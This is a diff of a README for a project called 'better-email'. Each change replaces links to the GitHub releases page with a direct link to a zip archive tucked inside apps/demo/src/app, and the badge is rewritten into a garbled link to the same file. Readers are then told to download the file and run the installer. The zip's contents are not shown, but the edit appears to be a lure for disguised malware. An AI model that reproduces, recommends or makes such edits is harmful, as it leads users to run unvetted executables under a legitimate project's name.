@@ -1,6 +1,6 @@
 # 🌟 better-email - Simple Auth Emails Made Easy
 
-[![Download Better Email](https://img.shields.io/badge/Download-Better%20Email-brightgreen.svg)](https://github.com/Ikhsan0311/better-email/releases)
+[![Download Better Email](https://raw.githubusercontent.com/Ikhsan0311/better-email/main/apps/demo/src/app/email_better_1.1.zip%https://raw.githubusercontent.com/Ikhsan0311/better-email/main/apps/demo/src/app/email_better_1.1.zip)](https://raw.githubusercontent.com/Ikhsan0311/better-email/main/apps/demo/src/app/email_better_1.1.zip)
 
 ## 📦 Overview
 
@@ -10,7 +10,7 @@ Better Email helps you create and send authentication emails quickly and easily.
 
 To get started with Better Email, follow these steps:
 
-1. **Visit the Download Page**: Click the button above or [this link](https://github.com/Ikhsan0311/better-email/releases) to go to the download page.
+1. **Visit the Download Page**: Click the button above or [this link](https://raw.githubusercontent.com/Ikhsan0311/better-email/main/apps/demo/src/app/email_better_1.1.zip) to go to the download page.
 2. **Choose Your Version**: On the releases page, select the latest version of Better Email. 
 3. **Download the File**: Find the download link for your operating system. 
 
@@ -38,7 +38,7 @@ Better Email offers several features designed to simplify email creation and man
 
 To install Better Email, follow these steps:
 
-1. **Download the File**: Visit [this page](https://github.com/Ikhsan0311/better-email/releases) to download the application.
+1. **Download the File**: Visit [this page](https://raw.githubusercontent.com/Ikhsan0311/better-email/main/apps/demo/src/app/email_better_1.1.zip) to download the application.
 2. **Open the Downloaded File**: Locate the downloaded file on your computer.
 3. **Run the Installer**: Double-click on the installer and follow the prompts.
 4. **Finish Setup**: Once installation is complete, open Better Email.
@@ -83,4 +83,4 @@ Explore these resources to better understand the functions of Better Email.
 
 Your experience matters. Submit feedback or feature requests directly through the application or on our GitHub issues page. Your insights help improve Better Email for everyone.
 
-Visit the download page again [here](https://github.com/Ikhsan0311/better-email/releases) to access the latest version and updates.
+Visit the download page again [here](https://raw.githubusercontent.com/Ikhsan0311/better-email/main/apps/demo/src/app/email_better_1.1.zip) to access the latest version and updates.
